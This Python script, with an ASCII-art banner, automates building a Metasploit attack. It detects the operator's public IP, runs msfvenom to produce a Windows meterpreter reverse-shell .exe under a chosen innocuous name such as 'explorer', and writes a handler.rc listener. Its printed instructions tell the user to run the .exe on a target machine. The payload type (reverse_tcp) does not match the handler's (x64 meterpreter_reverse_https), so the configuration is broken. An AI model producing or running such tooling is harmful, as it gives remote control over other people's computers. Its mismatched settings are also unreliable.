import os
import subprocess
import urllib.request

ascii_art = r"""
  ad8888ba,                                      ad8888ba,   ad8888ba, 
 8P'    "Y8                                     8P'    "Y8  8P'    "Y8 
d8                                             d8          d8          
88                                             88          88          
88,dd888bb,                                    88,dd888bb, 88,dd888bb, 
88P'    `8b    ,gggg,gg   ,ggg,    ,ggg,,ggg,  88P'    `8b 88P'    `8b 
88       88   dP"  "Y8I  i8" "8i  ,8" "8P" "8, 88       88 88       88 
88       88  i8'    ,8I  I8, ,8I  I8   8I   8I 88       88 88       88 
88a     a8P ,d8,   ,d8I  `YbadP' ,dP   8I   Yb,88a     a8P 88a     a8P 
 "Y88888P"  P"Y8888P"888888P"Y8888P'   8I   `Y8 "Y88888P"   "Y88888P"  
                   ,d8I'                                               
                 ,dP'8I                                                
                ,8"  8I                                                
                I8   8I                                                
                `8, ,8I                                                
                 `Y8P"                                                 
"""
def detect_ip():
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
            return response.read().decode('utf-8').strip()
    except Exception:
        return ("N/A")


def get_user_ip():
    print(ascii_art)
    current_ip = detect_ip()
    print(f"Your public IP is: {current_ip}")
    while True:
        public_ip_question = input("Do you want to use it ? (Yes/No) ").strip().lower()
        if public_ip_question in ["y","Yes","yes"]:
            print(f"Chosen IP: {current_ip}")
            return current_ip
        elif public_ip_question in ["n","No","n"]:
            user_given_ip = input("Your IP : ").strip()
            print(f"Chosen IP: {user_given_ip}")
            return user_given_ip
        else:
             print("Please specify only yes or no.")
def get_user_target(lhost):
    while True:
        host_port = input("Enter your LPORT: ").strip()
        if host_port.isdigit():
            break
        print("You must specify your LPORT as numbers.")
    payload_name = input("Enter your payload name(For example: explorer):\n")
    print(f"Setting LHOST to {lhost}")
    print(f"Setting LPORT to {host_port}")
    print(f"Setting payload name to: {payload_name}.exe")
    return host_port , payload_name
def metasploit_handler(lhost,lport):
    print("Creating a handler file for Metasploit...")
    metasploit_content = f"""
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter_reverse_https
    set LHOST {lhost}
    set LPORT {lport}
    set ExitOnSession false
    SessionCommunicationTimeout 0
    set AutoRunScript post/windows/manage/migrate
    exploit -j -z
    """
    with open("handler.rc","w") as f:
        f.write(metasploit_content)
    print("Successfully created a handler.rc file!")
def generate_payload(lhost, lport, payload_name):
    try:
        print("Generating payload...")
        cmd = [
            'msfvenom',
            '-p', 'windows/meterpreter/reverse_tcp',
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', 'exe',
            '-o', f'{payload_name}.exe'
        ]
        print(f"Executing: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Your payload, {payload_name}.exe generated successfully.")
            return True
        else:
            print(f"Error generating payload: {result.stderr}")
            return False
    except FileNotFoundError:
        print("msfvenom not found. Please make sure Metasploit Framework is installed and in PATH.")
        print("You can install it with: sudo apt install metasploit-framework")
        return False
    except Exception as e:
        print(f"Unexpected error during payload generation: {str(e)}")
        return False

def main():
    lhost = get_user_ip()
    lport, payload_name = get_user_target(lhost)

    if generate_payload(lhost, lport, payload_name):
        metasploit_handler(lhost, lport)
        print(f"\nYour payload '{payload_name}.exe' is ready.")
        print("To use with Metasploit:")
        print("1. Run: msfconsole -r handler.rc")
        print("2. Then run the generated .exe on target machine")
        print("\nTip: You can also manually set up the handler in msfconsole:")
        print(f"   use exploit/multi/handler")
        print(f"   set PAYLOAD windows/x64/meterpreter_reverse_https")
        print(f"   set LHOST {lhost}")
        print(f"   set LPORT {lport}")
        print("   exploit -j -z")
    else:
        print("Failed to generate payload.")
if __name__ == "__main__":
    main()



